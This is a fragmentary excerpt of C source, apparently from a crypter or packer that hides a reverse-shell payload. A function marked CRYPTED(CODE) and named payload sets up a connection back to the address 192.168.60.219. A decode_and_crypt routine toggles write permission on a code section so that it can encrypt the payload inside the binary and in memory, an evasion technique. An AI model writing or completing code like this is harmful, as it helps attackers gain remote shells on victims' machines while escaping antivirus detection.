...
CRYPTED(CODE) void payload(int portav) {
  ...
  revsockaddr.sin_addr.s_addr = inet_addr("192.168.60.219");
...
static void decode_and_crypt(crypter_t *crypter) {
  ...
  /* Give W permission on .unix && crypt payload in binary + memory && Remove W
   * permission */
  ...
  change_section_permissions((unsigned char *)&payload, crypter->seg_len,
                             false);
